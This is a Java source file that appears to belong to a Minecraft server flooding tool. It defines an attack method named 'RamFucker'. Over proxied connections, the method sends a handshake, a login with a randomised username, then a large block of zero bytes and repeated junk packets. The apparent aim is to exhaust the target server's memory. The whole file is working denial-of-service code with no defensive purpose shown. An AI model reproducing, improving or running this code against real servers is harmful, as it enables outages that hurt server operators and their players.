package dev.xdmeow.core.methods.impl;

import java.io.IOException;

import dev.xdmeow.BanKai;
import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.helper.RandomUtils;
import dev.xdmeow.core.util.mcutil.ext.Handshake;
import dev.xdmeow.core.util.mcutil.ext.LoginRequest;
import dev.xdmeow.core.util.proxy.Proxy;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class RamFucker implements IMethod{

    private Handshake handshake;
    private byte[] bytes;
    private byte[] xdarr;

    public RamFucker(){
        this.handshake = new Handshake(BanKai.protocol, BanKai.srvRecord, BanKai.port, 2);
        this.bytes = this.handshake.getWrappedPacket();
        xdarr = new byte[15000];
    }
    
    @Override
    public void accept(Channel channel, Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream out = new ByteBufOutputStream(b);
            try {
                channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(RandomUtils.randomUTF16String1(13)+"_XD")).getWrappedPacket()));
                out.write(this.xdarr);
                for(int i = 0; i < 260; i++){
                    out.write(3);
                    out.write(0);
                    out.write(1);
                    out.write(49);
                }
                out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        channel.writeAndFlush(b);
        channel.writeAndFlush(out);
        channel.close();

        ++NettyBootstrap.currentConnections;
        ++NettyBootstrap.totalConnections;
    }
}
